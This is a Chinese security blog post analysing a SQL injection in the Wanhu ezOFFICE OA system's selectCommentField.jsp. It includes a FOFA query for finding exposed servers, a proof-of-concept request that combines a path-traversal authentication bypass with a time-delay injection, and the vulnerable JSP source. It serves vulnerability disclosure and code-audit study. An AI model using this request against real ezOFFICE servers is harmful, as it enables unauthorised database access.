---
title: "万户ezOFFICE selectCommentField.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-selectCommentField-tableId-sqli.html
asset_dir: assets/万户ezoffice-selectcommentfield.jsp-sql注入漏洞
---

# 万户ezOFFICE selectCommentField.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/18 08:31
* 1290浏览
* [0评论](#comment)
* 27分钟阅读

深入探索

网络安全培训

Web安全书籍

SQL注入检测工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入防护

# 0x02 漏洞概述

万户 ezOFFICE platform/platform/custom/custom\_database/dropdownselect/selectCommentField.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_database/dropdownselect/selectCommentField.jsp?tableId=1+waitfor+delay+'0:0:6'--+- HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 6 秒

代码安全审计

[![万户ezOFFICE selectCommentField.jsp SQL注入漏洞](images/img-001-b91bb9025653.webp)](https://image.mrxn.net/d861d8e6664e49b6b06f7f7504e1aafb.webp)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
>
> 漏洞扫描服务

selectCommentField.jsp 主要业务逻辑代码如下，非常简单！

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ include file="/public/include/init.jsp"%>
<%@ page import="com.whir.ezoffice.customdb.customdb.bd.CustomDatabaseBD" %>
<%
String tableId = request.getParameter("tableId");
String index = request.getParameter("index");
String val = request.getParameter("val");
if (val == null || "null".equals(val)) {
    val = "";
}

java.sql.Connection conn = null;
java.sql.Statement stmt = null;

java.util.List list = new java.util.ArrayList();
Object[] obj;
try {
    conn = new com.whir.common.util.DataSourceBase().getDataSource().getConnection();
    stmt = conn.createStatement();
    java.sql.ResultSet rs = stmt.executeQuery("select field_name,field_desname from tfield where (field_show=401) and field_table="+ tableId + " order by field_id");
    while (rs.next()) {
        obj = new String[2];
        obj[0] = rs.getString(1);
        obj[1] = rs.getString(2);
        list.add(obj);
    }
    rs.close();
    stmt.close();
} catch (Exception ex) {
} finally {
    if (conn != null) {
        conn.close();
    }
}
%>
    <select onchange="setSelectObj(this,'<%=index%>');" class="selectlist" style="width:50%;">
        <option value=""></option>
        <%
        if(list.size()>0){
          for(int i=0;i<list.size();i++){   
            obj=(Object[])list.get(i);  
        %>
          <option value="<%=obj[0].toString()%>" <%if(val.trim().equals(obj[0].toString().trim())){out.print("selected");}%>><%=obj[1].toString()%></option>
        <%}
        }%>
    </select>
```

主要关注 这一行

物流软件安全

```
java.sql.ResultSet rs = stmt.executeQuery("select field_name,field_desname from tfield where (field_show=401) and field_table="+ tableId + " order by field_id");
```

又是一个明显的直将 `tableId` 参数拼接进SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，还是这么朴实无华！

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.0x01 产品简介](#toc-1-)
* [2.0x02 漏洞概述](#toc-2-)
* [3.0x03 复现环境](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [5.漏洞分析](#toc-5-)
* [6.最后](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户ezOFFICE selectCommentField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectCommentField-tableId-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-selectCommentField-tableId-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

编程

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-selectCommentField-tableId-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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